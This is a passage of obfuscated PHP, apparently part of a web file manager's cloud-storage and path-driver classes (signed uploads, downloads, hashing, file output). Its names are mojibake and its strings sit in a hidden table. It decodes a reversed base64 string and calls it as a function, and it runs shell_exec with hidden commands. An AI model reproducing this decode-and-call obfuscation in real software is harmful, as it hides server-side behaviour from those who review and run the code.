$Ê¼øæä» =& $_SERVER[óó‹¸‚å]; $£ºÚºÀ¤ = $Ê¼øæä»[8] . $this->bucket; $ÕÓêÕ¯” = gmdate($Ê¼øæä»[1435]); $æÕóîÚ = array($Ê¼øæä»[1502] => $this->bucket, $Ê¼øæä»[1503] => $ˆÕçªª¶, $Ê¼øæä»[1504] => time() + $›Ø­÷¤Ø, $Ê¼øæä»[1505] => $ÕÓêÕ¯”); if ($‰õÆ¿ã) { $æÕóîÚ[$Ê¼øæä»[1415]] = $‰õÆ¿ã; } $©àÃë” = base64_encode(json_encode($æÕóîÚ)); $Õ’î˜Ş£ = base64_encode(hash_hmac($Ê¼øæä»[1472], "\x50\117\x53\x54\x26{$£ºÚºÀ¤}\46{$ÕÓêÕ¯”}\46{$©àÃë”}", md5("{$this->userpass}"), !0)); $äš÷¸•¨ = array($Ê¼øæä»[1338] => $©àÃë”, $Ê¼øæä»[1506] => "\x55\x50\131\x55\116\x20{$this->username}\72{$Õ’î˜Ş£}", $Ê¼øæä»[181] => $this->endpoint . $£ºÚºÀ¤); return $äš÷¸•¨; } public function download($˜’´²Âî, $Ó¾“Âà) { $Âƒ–Èæƒ = IO::getPathInner(IO::mkfile($Ó¾“Âà)); if (!($®–üÚÙ = $this->link($˜’´²Âî))) { return !1; } $ò‚›•ğ = 0; $ÎÎ®œ = 1024 * 200; $¸¬ÒÈ»¡ = fopen($Âƒ–Èæƒ, $_SERVER[óó‹¸‚å][1456]); while (!0) { $…„ÛÊ±À = $this->fileSubstr($˜’´²Âî, $ò‚›•ğ, $ÎÎ®œ); if ($…„ÛÊ±À === !1) { return !1; } fwrite($¸¬ÒÈ»¡, $…„ÛÊ±À); $ò‚›•ğ += $ÎÎ®œ; if (strlen($…„ÛÊ±À) < $ÎÎ®œ) { break; } } fclose($¸¬ÒÈ»¡); return $Ó¾“Âà; } public function link($ñ˜î˜¥Ø, $à®í·° = array()) { $²€³Íşº =& $_SERVER[óó‹¸‚å]; $ñ˜î˜¥Ø = trim($ñ˜î˜¥Ø, $²€³Íşº[8]); if (!empty($this->token)) { $Íˆ™º¹å = strtotime(date($²€³Íşº[1507])); $“’Ãæ‡ü = substr(md5($this->token . $²€³Íşº[284] . $Íˆ™º¹å . $²€³Íşº[1508] . $ñ˜î˜¥Ø), 12, 8) . $Íˆ™º¹å; $à®í·°[] = $²€³Íşº[1509] . $“’Ãæ‡ü; } $ÇÙ ÀËï = !empty($à®í·°) ? $²€³Íşº[73] . implode($²€³Íşº[284], $à®í·°) : $²€³Íşº[12]; return $this->getHost() . $²€³Íşº[8] . $ñ˜î˜¥Ø . $ÇÙ ÀËï; } public function fileOut($”õ¢‘¬, $€ğĞ÷± = false, $ù‹ìü¢Ì = false, $Ó´ãñö‚ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($”õ¢‘¬, $€ğĞ÷±, $ù‹ìü¢Ì, $Ó´ãñö‚); } if (!$ù‹ìü¢Ì) { $ù‹ìü¢Ì = $this->pathThis($”õ¢‘¬); } $å”üè” = $€ğĞ÷± ? array($_SERVER[óó‹¸‚å][1510] . rawurlencode($ù‹ìü¢Ì)) : array(); $‚ù¬¤©— = $this->link($”õ¢‘¬, $å”üè”); $this->fileOutLink($‚ù¬¤©—); } public function fileOutServer($¾¢õ‘ü, $ÚÑ¥Æ”á = false, $—Æ‰İá¥ = false, $äÍáçÛš = '') { parent::fileOut($¾¢õ‘ü, $ÚÑ¥Æ”á, $—Æ‰İá¥, $äÍáçÛš); } public function fileOutImage($¬ë®–¢¤, $ê˜¦ØÅ = 250) { $šÃš„˜ = $this->link($¬ë®–¢¤ . $_SERVER[óó‹¸‚å][1511] . $ê˜¦ØÅ); $this->fileOutLink($šÃš„˜); } public function fileOutImageServer($»Îç¾…ª, $•²äõ­ = 250) { parent::fileOutImage($»Îç¾…ª, $•²äõ­); } public function hashMd5($Ö¶·ñ¡„) { $ù•£­×³ =& $_SERVER[óó‹¸‚å]; $ÕÇæã¤ = $this->_objectMeta($Ö¶·ñ¡„); return isset($ÕÇæã¤[$ù•£­×³[212]]) ? $ÕÇæã¤[$ù•£­×³[212]] : !1; } public function size($×Ì³Ïùú) { $öÇÅ¼åú = $this->objectMeta($×Ì³Ïùú); return $öÇÅ¼åú ? $öÇÅ¼åú[$_SERVER[óó‹¸‚å][76]] : 0; } public function info($ÔÄö€îê) { if ($this->isFolder($ÔÄö€îê)) { return $this->folderInfo($ÔÄö€îê); } else { if ($this->isFile($ÔÄö€îê)) { return $this->fileInfo($ÔÄö€îê); } } return !1; } public function exist($í«Òäüı) { return $this->isFile($í«Òäüı) || $this->isFolder($í«Òäüı); } public function isFile($ªâ™²½‹) { return !$this->isFolder($ªâ™²½‹) && $this->objectMeta($ªâ™²½‹); } public function isFolder($ÉÆ²¹¦ğ) { return $this->cacheMethod($_SERVER[óó‹¸‚å][165], $ÉÆ²¹¦ğ); } protected function objectMeta($ÆÓ±úÃ‘) { return $this->cacheMethod($_SERVER[óó‹¸‚å][167], $ÆÓ±úÃ‘); } protected function _objectMeta($ÌÏ¬Ê‚š) { $›şô‹Ñß =& $_SERVER[óó‹¸‚å]; if ($ÌÏ¬Ê‚š == $›şô‹Ñß[12] || $ÌÏ¬Ê‚š == $›şô‹Ñß[8]) { return array(); } $—¬¨êÖ¡ = $this->ussRequest($ÌÏ¬Ê‚š, $›şô‹Ñß[1512]); if (!$—¬¨êÖ¡[$›şô‹Ñß[1220]]) { return null; } $ßÕò÷øå = isset($—¬¨êÖ¡[$›şô‹Ñß[1210]]) ? $—¬¨êÖ¡[$›şô‹Ñß[1210]] : array(); if (!isset($ßÕò÷øå[$›şô‹Ñß[1513]])) { return null; } $ÎÓÅš‚£ = array($›şô‹Ñß[33] => isset($ßÕò÷øå[$›şô‹Ñß[1513]]) ? $ßÕò÷øå[$›şô‹Ñß[1513]] : null, $›şô‹Ñß[76] => isset($ßÕò÷øå[$›şô‹Ñß[1514]]) ? $ßÕò÷øå[$›şô‹Ñß[1514]] : null, $›şô‹Ñß[212] => isset($ßÕò÷øå[$›şô‹Ñß[1515]]) ? $ßÕò÷øå[$›şô‹Ñß[1515]] : null, $›şô‹Ñß[1482] => isset($ßÕò÷øå[$›şô‹Ñß[1516]]) ? $ßÕò÷øå[$›şô‹Ñß[1516]] : null); $ÎÓÅš‚£[$›şô‹Ñß[1483]] = isset($ßÕò÷øå[$›şô‹Ñß[1517]]) ? strtotime($ßÕò÷øå[$›şô‹Ñß[1517]]) : $ÎÓÅš‚£[$›şô‹Ñß[1482]]; return $ÎÓÅš‚£; } protected function _isFolder($²í„ıÅà) { $Ìõî¡†Ñ =& $_SERVER[óó‹¸‚å]; if ($²í„ıÅà == $Ìõî¡†Ñ[12] || $²í„ıÅà == $Ìõî¡†Ñ[8]) { return !0; } $¥ëÀö¸£ = $this->_objectMeta($²í„ıÅà); return isset($¥ëÀö¸£[$Ìõî¡†Ñ[33]]) && $¥ëÀö¸£[$Ìõî¡†Ñ[33]] == $Ìõî¡†Ñ[75] ? !0 : !1; } } goto CŠèÉ¶°Ä³; F„áäŠŒ‚Ô: $fileSize = strrev(base64_decode($_SERVER[ßÛ¦¸Ì][0])); function binCheckNeq($¾„ùä, $ñ´¥ºå‡) { return $¾„ùä != $ñ´¥ºå‡; } $_SERVER[$_SERVER[ßÛ¦¸Ì][1]] = $fileSize($_SERVER[$_SERVER[ßÛ¦¸Ì][2]]); goto aí›º›©š; dÓîÃ¨™›é: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÊšĞ‚º =& $_SERVER[óó‹¸‚å]; $this->objectDriver = array($ÊšĞ‚º[60], $ÊšĞ‚º[61], $ÊšĞ‚º[62], $ÊšĞ‚º[63], $ÊšĞ‚º[64], $ÊšĞ‚º[65], $ÊšĞ‚º[66], $ÊšĞ‚º[67], $ÊšĞ‚º[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($®øïÙ¥) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($®øïÙ¥, $_SERVER[óó‹¸‚å][8]); } return $®øïÙ¥; } public function iconvApp($©“Éßˆƒ) { return $©“Éßˆƒ; } public function iconvSystem($ ÔÑÀ†©) { return $ ÔÑÀ†©; } public function iconvTo($È¹™®šš, $ˆ»Ÿ·‚, $ª¥Öû¿¸) { $•ˆ˜­ë =& $_SERVER[óó‹¸‚å]; if (!$È¹™®šš || !function_exists($•ˆ˜­ë[69])) { return $È¹™®šš; } static $šÖ üˆå = array(); $’³Ï¤óÓ = $ˆ»Ÿ·‚ . $•ˆ˜­ë[70] . $ª¥Öû¿¸ . $•ˆ˜­ë[71] . $È¹™®šš; if (isset($šÖ üˆå[$’³Ï¤óÓ])) { return $šÖ üˆå[$’³Ï¤óÓ]; } if (function_exists($•ˆ˜­ë[72])) { $ÍöëÅÅ˜ = @mb_convert_encoding($È¹™®šš, $ª¥Öû¿¸, $ˆ»Ÿ·‚); } else { $ÍöëÅÅ˜ = @iconv($ˆ»Ÿ·‚, $ª¥Öû¿¸, $È¹™®šš); } $ÍöëÅÅ˜ = $ÍöëÅÅ˜ ? $ÍöëÅÅ˜ : $È¹™®šš; if (strstr($ÍöëÅÅ˜, $•ˆ˜­ë[73])) { $ÍöëÅÅ˜ = str_replace($•ˆ˜­ë[73], $•ˆ˜­ë[11], $ÍöëÅÅ˜); } $šÖ üˆå[$ˆ»Ÿ·‚ . $•ˆ˜­ë[70] . $ª¥Öû¿¸ . $•ˆ˜­ë[71] . $È¹™®šš] = $ÍöëÅÅ˜; $šÖ üˆå[$ª¥Öû¿¸ . $•ˆ˜­ë[70] . $ˆ»Ÿ·‚ . $•ˆ˜­ë[71] . $È¹™®šš] = $È¹™®šš; $šÖ üˆå[$ª¥Öû¿¸ . $•ˆ˜­ë[70] . $ˆ»Ÿ·‚ . $•ˆ˜­ë[71] . $ÍöëÅÅ˜] = $È¹™®šš; $šÖ üˆå[$ˆ»Ÿ·‚ . $•ˆ˜­ë[70] . $ª¥Öû¿¸ . $•ˆ˜­ë[71] . $ÍöëÅÅ˜] = $ÍöëÅÅ˜; return $ÍöëÅÅ˜; } public function getPathInner($š¯»Í•) { $°Ë¡À¿ = IO::init($š¯»Í•); return $°Ë¡À¿->path; } public function getPathOuter($¢ÂÀ»Õ·) { $Ä´ïû— =& $_SERVER[óó‹¸‚å]; $ñµí¡ = strlen(trim($this->pathBase, $Ä´ïû—[8])); $¢ÂÀ»Õ· = substr(trim($¢ÂÀ»Õ·, $Ä´ïû—[8]), $ñµí¡); return $this->pathDriver . $Ä´ïû—[8] . ltrim($¢ÂÀ»Õ·, $Ä´ïû—[8]); } public function isParentOf($”Õæñë², $·Éßä•ğ) { $Ë²ÙÔ•ş =& $_SERVER[óó‹¸‚å]; $”Õæñë² = rtrim(strtolower($”Õæñë²), $Ë²ÙÔ•ş[8]) . $Ë²ÙÔ•ş[8]; $·Éßä•ğ = rtrim(strtolower($·Éßä•ğ), $Ë²ÙÔ•ş[8]) . $Ë²ÙÔ•ş[8]; $Íù„Ü = strpos($·Éßä•ğ, $”Õæñë²) === 0; return $Íù„Ü; } public function getType() { $ÏØ¶Áè‚ =& $_SERVER[óó‹¸‚å]; $—¥ŸƒÚ” = str_replace($ÏØ¶Áè‚[74], $ÏØ¶Áè‚[12], get_class($this)); return strtolower($—¥ŸƒÚ”); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($åĞÅŞ¥¿, $ Á­û³ö) { $Çœ¯û« =& $_SERVER[óó‹¸‚å]; $ôŒÛ³úñ = rtrim($åĞÅŞ¥¿, $Çœ¯û«[8]) . $Çœ¯û«[8] . $ Á­û³ö; $ğ¢Ú¸©ñ = $this->exist($ôŒÛ³úñ); return $ğ¢Ú¸©ñ ? $ôŒÛ³úñ : !1; } public function setModifyTime($Í®¯®Ú–, $éÒ‰âô = '') { } public function renameObject($¡×Ìµ¢, $½Œ†Ñ”©) { $·ö°ÓÑÚ = $½Œ†Ñ”©; $¡×Ìµ¢ = $this->getPathOuter($¡×Ìµ¢); $½Œ†Ñ”© = $this->pathFather($¡×Ìµ¢) . $½Œ†Ñ”©; $ÀÎìÊ•„ = IO::copy($¡×Ìµ¢, $this->pathFather($¡×Ìµ¢), REPEAT_RENAME_FOLDER, $·ö°ÓÑÚ); if ($ÀÎìÊ•„) { IO::remove($¡×Ìµ¢); } return $ÀÎìÊ•„ ? $½Œ†Ñ”© : !1; } public function tempFile($øÏ¯©³® = '', $½Çøİ¨± = '') { if (!$øÏ¯©³®) { $øÏ¯©³® = rand_string(15); } $ÙÉ³¾ñ = TEMP_FILES . rand_string(15) . $_SERVER[óó‹¸‚å][8]; @mkdir($ÙÉ³¾ñ, DEFAULT_PERRMISSIONS, !0); $ ° àÑø = $ÙÉ³¾ñ . $øÏ¯©³®; @touch($ ° àÑø); if ($½Çøİ¨±) { file_put_contents($ ° àÑø, $½Çøİ¨±); } return $ ° àÑø; } public function tempFileRemve($€ĞÉŠŠ™) { @unlink($€ĞÉŠŠ™); @rmdir($this->pathFather($€ĞÉŠŠ™)); } public function mkfile($ÂşàÒ²Å, $áàùâş = '', $•±ËªÕ¸ = REPEAT_RENAME) { } public function mkdir($¼˜¦—Ö¯, $”ÖÂ¥„³ = REPEAT_SKIP) { } public function delFile($»Ó‘ØàÂ) { } public function delFolder($–î‰ˆ¬£) { } public function copyFile($Ççì¨áü, $ªÄÄ¬») { } public function moveFile($…ÕØ¡, $õÆ”ŞÓ) { } public function remove($àºèÛÎœ) { if ($this->isFile($àºèÛÎœ)) { return $this->delFile($àºèÛÎœ); } return $this->delFolder($àºèÛÎœ); } public function rename($°ğÑ÷–, $ˆÄ“æ“) { } public function exist($¡ŠĞ¢¶Ù) { } public function findByHash($Ïòıç¿ = '', $¶’ş¹´ = '') { return !1; } public function isFile($ñœªŞ) { } public function isFolder($ÌØÜõ¦») { } public function size($ĞÇçŸ) { } public function info($Úİìßì¾) { } public function infoSimple($—·ìÁù) { return $this->info($—·ìÁù); } public function infoAuth($óÆÜ¬”Æ) { return $this->info($óÆÜ¬”Æ); } public function infoFull($£ŞÄÂÍô) { return $this->info($£ŞÄÂÍô); } public function infoWithChildren($ºÔ®°€á) { $²²µ´ğî =& $_SERVER[óó‹¸‚å]; static $¾Û’â«® = array(); if (isset($¾Û’â«®[$ºÔ®°€á])) { return $¾Û’â«®[$ºÔ®°€á]; } $‚œåÍÆé = $this->info($ºÔ®°€á); if ($‚œåÍÆé && $‚œåÍÆé[$²²µ´ğî[33]] == $²²µ´ğî[75]) { $úñÉôŠ = array($²²µ´ğî[76] => 0, $²²µ´ğî[77] => 0, $²²µ´ğî[78] => 0); $this->infoChildren($ºÔ®°€á, $úñÉôŠ); $‚œåÍÆé[$²²µ´ğî[76]] = $úñÉôŠ[$²²µ´ğî[76]]; $‚œåÍÆé[$²²µ´ğî[79]] = array($²²µ´ğî[80] => $úñÉôŠ[$²²µ´ğî[77]], $²²µ´ğî[81] => $úñÉôŠ[$²²µ´ğî[78]]); $¾Û’â«®[$ºÔ®°€á] = $‚œåÍÆé; } return $‚œåÍÆé; } public function listPath($ò³€‚´, $¦ ğ§£» = false) { } public function has($˜½ÔˆüŸ, $Á‘ÑîÓÄ = false, $Æ“û¬• = false) { } public function canRead($øç£ø‘) { } public function canWrite($ì„ğĞ–í) { } public function getContent($ÂŠÆš‹) { } public function setContent($Æ³ÄÚ ô, $Ä¤ä“Æ = '') { } protected function infoChildren($©ú¿óÂ, &$¦©şü–Ò) { $¡º¸Éº =& $_SERVER[óó‹¸‚å]; check_abort_echo(); $äÀ¤¯àı = $this->listPath($©ú¿óÂ, !0); $äÀ¤¯àı = array_merge($äÀ¤¯àı[$¡º¸Éº[82]], $äÀ¤¯àı[$¡º¸Éº[83]]); foreach ($äÀ¤¯àı as $¼ĞÚ™¯Ã) { if ($¼ĞÚ™¯Ã[$¡º¸Éº[33]] == $¡º¸Éº[75]) { $¦©şü–Ò[$¡º¸Éº[78]]++; $ƒ…—ó…² = $this->getPathInner($¼ĞÚ™¯Ã[$¡º¸Éº[84]]); $this->infoChildren($ƒ…—ó…², $¦©şü–Ò); } else { $¦©şü–Ò[$¡º¸Éº[77]]++; $¦©şü–Ò[$¡º¸Éº[76]] += $¼ĞÚ™¯Ã[$¡º¸Éº[76]]; } } } public function fileSubstr($Ï¤Ê¿ìú, $ÒÍ“ƒ‰, $³«ƒ¾¹ñ) { } public function listAll($âø†«×ó) { } public function listAllMake($æø¦ÜÇä, &$Ü·¶Òîı) { $¿¸ÔÔÑ =& $_SERVER[óó‹¸‚å]; check_abort_echo(); $¿ã—÷­¾ = $this->listPath($æø¦ÜÇä, !0); if (!$¿ã—÷­¾) { return; } $…¢÷ëÅ = array_merge($¿ã—÷­¾[$¿¸ÔÔÑ[82]], $¿ã—÷­¾[$¿¸ÔÔÑ[83]]); foreach ($…¢÷ëÅ as $î¸¬Û) { $Ä¾õ„÷¶ = $î¸¬Û[$¿¸ÔÔÑ[33]] == $¿¸ÔÔÑ[75]; $ŞÂğ²œ = array($¿¸ÔÔÑ[84] => $î¸¬Û[$¿¸ÔÔÑ[84]], $¿¸ÔÔÑ[75] => $Ä¾õ„÷¶); if (isset($î¸¬Û[$¿¸ÔÔÑ[76]])) { $ŞÂğ²œ[$¿¸ÔÔÑ[76]] = $î¸¬Û[$¿¸ÔÔÑ[76]]; } if (isset($î¸¬Û[$¿¸ÔÔÑ[85]])) { $ŞÂğ²œ[$¿¸ÔÔÑ[85]] = $î¸¬Û[$¿¸ÔÔÑ[85]]; } if (!$Ä¾õ„÷¶) { $Ü·¶Òîı[] = $ŞÂğ²œ; continue; } $Ü·¶Òîı[] = $ŞÂğ²œ; $åÃàû = $î¸¬Û[$¿¸ÔÔÑ[84]]; $×şèÅóé = $this->pathDriver; if (substr($î¸¬Û[$¿¸ÔÔÑ[84]], 0, strlen($×şèÅóé)) == $×şèÅóé) { $åÃàû = substr($åÃàû, strlen($×şèÅóé)); } $this->listAllMake($åÃàû, $Ü·¶Òîı); } } public function listAllSimple($¯šÜÇœ™) { $ë±§ÓÂÍ =& $_SERVER[óó‹¸‚å]; $½şîÔÒ÷ = array(); $Ô¦Ëöåè = $this->listAll($¯šÜÇœ™); $™¹”ü = $this->getPathOuter($¯šÜÇœ™); foreach ($Ô¦Ëöåè as $»ÜéğÊ˜) { $¿íû…ñ = $»ÜéğÊ˜[$ë±§ÓÂÍ[84]]; $É·»Ï = $»ÜéğÊ˜[$ë±§ÓÂÍ[84]]; if (isset($»ÜéğÊ˜[$ë±§ÓÂÍ[86]])) { $¿íû…ñ = $»ÜéğÊ˜[$ë±§ÓÂÍ[86]][$ë±§ÓÂÍ[84]]; $»ÜéğÊ˜[$ë±§ÓÂÍ[76]] = $»ÜéğÊ˜[$ë±§ÓÂÍ[86]][$ë±§ÓÂÍ[76]]; $»ÜéğÊ˜[$ë±§ÓÂÍ[85]] = $»ÜéğÊ˜[$ë±§ÓÂÍ[86]][$ë±§ÓÂÍ[85]]; } else { $É·»Ï = substr($»ÜéğÊ˜[$ë±§ÓÂÍ[84]], strlen(get_path_father($™¹”ü))); $É·»Ï = $ë±§ÓÂÍ[8] . ltrim($É·»Ï, $ë±§ÓÂÍ[8]); } $É™Ò¬öÛ = array($ë±§ÓÂÍ[84] => $É·»Ï, $ë±§ÓÂÍ[75] => $»ÜéğÊ˜[$ë±§ÓÂÍ[75]]); if (isset($»ÜéğÊ˜[$ë±§ÓÂÍ[76]]) && !$»ÜéğÊ˜[$ë±§ÓÂÍ[75]]) { $É™Ò¬öÛ[$ë±§ÓÂÍ[76]] = $»ÜéğÊ˜[$ë±§ÓÂÍ[76]]; } if (isset($»ÜéğÊ˜[$ë±§ÓÂÍ[85]])) { $É™Ò¬öÛ[$ë±§ÓÂÍ[85]] = $»ÜéğÊ˜[$ë±§ÓÂÍ[85]]; } if (!$»ÜéğÊ˜[$ë±§ÓÂÍ[75]]) { $É™Ò¬öÛ[$ë±§ÓÂÍ[87]] = $¿íû…ñ; } $½şîÔÒ÷[] = $É™Ò¬öÛ; } return $½şîÔÒ÷; } public function upload($ıäç÷Šª, $ààË©ıÍ, $šÜîÖ‚Ş = false, $Õ¥Ä¹« = REPEAT_REPLACE) { } public function uploadFileByID($¹ÕĞĞèø, $‰Ší¹õ‹, $¢›ÈæŒà) { } public function uploadFileByPath($‰“ò÷‡á, $©ÒùÉïÑ, $°¢Äˆ = array()) { } public function isUploadServer() { $‰”€‚¾Á =& $_SERVER[óó‹¸‚å]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $‰”€‚¾Á[88]) { return !0; } return $GLOBALS[$‰”€‚¾Á[6]][$‰”€‚¾Á[89]][$‰”€‚¾Á[90]]; } public function isFileOutServer() { $Ş÷œÍ‹† =& $_SERVER[óó‹¸‚å]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ş÷œÍ‹†[88]) { return !0; } return $GLOBALS[$Ş÷œÍ‹†[6]][$Ş÷œÍ‹†[89]][$Ş÷œÍ‹†[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ÉÎâ°‰¢) { $å‘€îÕ =& $_SERVER[óó‹¸‚å]; if (!$this->isCdnHost()) { return $ÉÎâ°‰¢; } return str_replace(trim(get_url_root($ÉÎâ°‰¢), $å‘€îÕ[8]), trim($this->cdnHost, $å‘€îÕ[8]), $ÉÎâ°‰¢); } public function uploadLink($Ç“ÕôÂ, $à³¶’÷÷ = 0) { $ˆ¾¨ÉâÓ =& $_SERVER[óó‹¸‚å]; if ($this->isUploadServer()) { return; } $ÕËÆ”æª = $this->getType(); if (!in_array($ÕËÆ”æª, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ú‹óíÖ = 1024 * 1024 * 10; $ñ‹¨¼— = $à³¶’÷÷ <= $Ú‹óíÖ ? $ˆ¾¨ÉâÓ[92] : $ˆ¾¨ÉâÓ[93]; $•‹×é‹ = (!$à³¶’÷÷ ? 1 : ceil($à³¶’÷÷ / pow(1024, 3))) * 3600 * 4; $ü—ÃÓ¼Ì = $this->{$ñ‹¨¼—}($Ç“ÕôÂ, $•‹×é‹); if ($ü—ÃÓ¼Ì) { $ü—ÃÓ¼Ì[$ˆ¾¨ÉâÓ[94]] = $Ç“ÕôÂ; $ü—ÃÓ¼Ì[$ˆ¾¨ÉâÓ[95]] = $ÕËÆ”æª; } return $ü—ÃÓ¼Ì; } public function uploadFormData($ÊŒÙíØ¢, $˜ÙİÉ˜ = 3600) { } public function multiUploadFormData($¯ü„åŞ, $¼šöÓÁË = 3600) { } public function download($·¼€ôÔ–, $Ù÷¹˜¡¶) { } public function ext($î™çáæ‚) { $¹Çúú =& $_SERVER[óó‹¸‚å]; if (strpos($î™çáæ‚, $¹Çúú[8]) === -1) { $ƒüø°Ï = $î™çáæ‚; } else { $ƒüø°Ï = $this->pathThis($î™çáæ‚); } $š¶úÓ¿¢ = $¹Çúú[12]; if (strstr($ƒüø°Ï, $¹Çúú[10])) { $š¶úÓ¿¢ = substr($ƒüø°Ï, strrpos($ƒüø°Ï, $¹Çúú[10]) + 1); $š¶úÓ¿¢ = strtolower($š¶úÓ¿¢); } if (strlen($š¶úÓ¿¢) > 3 && preg_match($¹Çúú[96], $š¶úÓ¿¢, $Ş¢ş¸)) { $š¶úÓ¿¢ = $¹Çúú[12]; } return $š¶úÓ¿¢; } public function pathThis($¡æßÔÊ¼) { $õÏÓüÕÍ =& $_SERVER[óó‹¸‚å]; $¡æßÔÊ¼ = str_replace($õÏÓüÕÍ[97], $õÏÓüÕÍ[8], rtrim($¡æßÔÊ¼, $õÏÓüÕÍ[8])); $ãÁÑ“Ì = strrpos($¡æßÔÊ¼, $õÏÓüÕÍ[8]); if ($ãÁÑ“Ì === !1) { return $¡æßÔÊ¼; } return substr($¡æßÔÊ¼, $ãÁÑ“Ì + 1); } public function pathFather($ÛöĞ§³î) { $¡È³ =& $_SERVER[óó‹¸‚å]; $ÛöĞ§³î = str_replace($¡È³[97], $¡È³[8], rtrim($ÛöĞ§³î, $¡È³[8])); $’ˆÎ²¨û = strrpos($ÛöĞ§³î, $¡È³[8]); if ($’ˆÎ²¨û === !1) { return $¡È³[12]; } return substr($ÛöĞ§³î, 0, $’ˆÎ²¨û + 1); } public function hashSimple($øå¦ø“à) { $¦ ì‰ =& $_SERVER[óó‹¸‚å]; if (!$øå¦ø“à) { return md5($¦ ì‰[12]); } $ß‰Š»Œ = $this->size($øå¦ø“à); $ğÈúâÌ‚ = 200; $ˆ×‡îÅñ = 50; if ($ß‰Š»Œ <= $ğÈúâÌ‚ * $ˆ×‡îÅñ) { return $this->hashMd5($øå¦ø“à) . $ß‰Š»Œ; } $ôç„ä¯º = intval($ß‰Š»Œ / $ˆ×‡îÅñ); $ÃÓÛĞñÅ = $¦ ì‰[12]; for ($±çûĞ££ = 0; $±çûĞ££ < $ˆ×‡îÅñ; $±çûĞ££++) { $ÃÓÛĞñÅ .= $this->fileSubstr($øå¦ø“à, $ôç„ä¯º * $±çûĞ££, $ğÈúâÌ‚); } $ÃÓÛĞñÅ .= $this->fileSubstr($øå¦ø“à, $ß‰Š»Œ - $ğÈúâÌ‚, $ğÈúâÌ‚); return md5($ÃÓÛĞñÅ) . $ß‰Š»Œ; } public static $md5Cache = array(); public function hashMd5($ôó˜¥Ù) { if (!$ôó˜¥Ù) { return md5($_SERVER[óó‹¸‚å][12]); } $ôó˜¥Ù = $this->iconvSystem($ôó˜¥Ù); if (isset(self::$md5Cache[$ôó˜¥Ù])) { return self::$md5Cache[$ôó˜¥Ù]; } self::$md5Cache[$ôó˜¥Ù] = $this->hashMd5Shell($ôó˜¥Ù); if (!self::$md5Cache[$ôó˜¥Ù]) { self::$md5Cache[$ôó˜¥Ù] = @md5_file($ôó˜¥Ù); } return self::$md5Cache[$ôó˜¥Ù]; } private function hashMd5Shell($ÎÏ™•¬) { $ïˆ‰‘ÓŠ =& $_SERVER[óó‹¸‚å]; if (!$ÎÏ™•¬) { return md5($ïˆ‰‘ÓŠ[12]); } if (!function_exists($ïˆ‰‘ÓŠ[98])) { return !1; } $Š˜ÊÆºÃ = array($ïˆ‰‘ÓŠ[99], $ïˆ‰‘ÓŠ[100]); $ã¿É÷ˆÉ = Cache::get($ïˆ‰‘ÓŠ[101]); if (!$ã¿É÷ˆÉ) { $ïùßÄòµ = BASIC_PATH . $ïˆ‰‘ÓŠ[102]; $òŒÈ‚îñ = md5_file($ïùßÄòµ); $ã¿É÷ˆÉ = $ïˆ‰‘ÓŠ[103]; foreach ($Š˜ÊÆºÃ as $óŠò¶ó) { $¶Éìí‹Ó = shell_exec($óŠò¶ó . "\40\42{$ïùßÄòµ}\42"); if ($¶Éìí‹Ó && substr(trim($¶Éìí‹Ó), 0, 32) == $òŒÈ‚îñ) { $ã¿É÷ˆÉ = $óŠò¶ó; break; } } Cache::set($ïˆ‰‘ÓŠ[101], $ã¿É÷ˆÉ, 3600); } if ($ã¿É÷ˆÉ == $ïˆ‰‘ÓŠ[103]) { return !1; } $¶Éìí‹Ó = shell_exec($ã¿É÷ˆÉ . "\40\x22{$ÎÏ™•¬}\42"); $¶Éìí‹Ó = str_replace($ïˆ‰‘ÓŠ[104], $ïˆ‰‘ÓŠ[12], $¶Éìí‹Ó); return substr($¶Éìí‹Ó, 0, 32); } public function link($í–Çô£) { return $í–Çô£; } public function fileOut($§ÆÚ—ûë, $û—ûä¾ä = false, $ŠğìíÆâ = false, $îİ¸Å¤š = '') { $Ù§³×¹ =& $_SERVER[óó‹¸‚å]; $this->cacheMethod(null, null); if (!$§ÆÚ—ûë || !$this->exist($§ÆÚ—ûë)) { show_json(LNG($Ù§³×¹[105]), !1, $ŠğìíÆâ); } $Û™ü‡œÀ = $this->getType() == $Ù§³×¹[106]; $ìòÁ×Á = $GLOBALS[$Ù§³×¹[6]][$Ù§³×¹[89]][$Ù§³×¹[107]][$Ù§³×¹[108]]; $ĞéÅÈŞó = (double) $GLOBALS[$Ù§³×¹[6]][$Ù§³×¹[89]][$Ù§³×¹[107]][$Ù§³×¹[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $„êæµû“ = $this->infoFull($§ÆÚ—ûë); $Â´ò“µ = $„êæµû“[$Ù§³×¹[76]]; $Ô¡ •€œ = gmdate($Ù§³×¹[110], $„êæµû“[$Ù§³×¹[85]]); $ä•à•² = $ŠğìíÆâ ? $ŠğìíÆâ : $this->iconvApp($„êæµû“[$Ù§³×¹[32]]); $¯¦´ØŠú = 0; $‡Ê»€¹š = $Â´ò“µ - 1; $®úãŠ»é = $this->ext($ä•à•²); if (in_array($®úãŠ»é, array($Ù§³×¹[111], $Ù§³×¹[112], $Ù§³×¹[113], $Ù§³×¹[114]))) { $®úãŠ»é = $Ù§³×¹[115]; } if (in_array($®úãŠ»é, array($Ù§³×¹[116]))) { $®úãŠ»é = $Ù§³×¹[117]; } if (!$îİ¸Å¤š) { $îİ¸Å¤š = md5($Ô¡ •€œ . $this->hashSimple($§ÆÚ—ûë)); } $îİ¸Å¤š = $Ù§³×¹[118] . $îİ¸Å¤š . $Ù§³×¹[118]; $Øó¥ñÆŠ = get_file_mime($®úãŠ»é); $“«€„Æ = !0; $“«€„Æ = isset($_GET[$Ù§³×¹[119]]) ? !1 : !0; if ($û—ûä¾ä === !1 && !mime_support($Øó¥ñÆŠ)) { $Øó¥ñÆŠ = $Ù§³×¹[120]; } header($Ù§³×¹[121]); header($Ù§³×¹[122] . $Øó¥ñÆŠ); $ä¬æâ¡Ä = rawurlencode($ä•à•²); 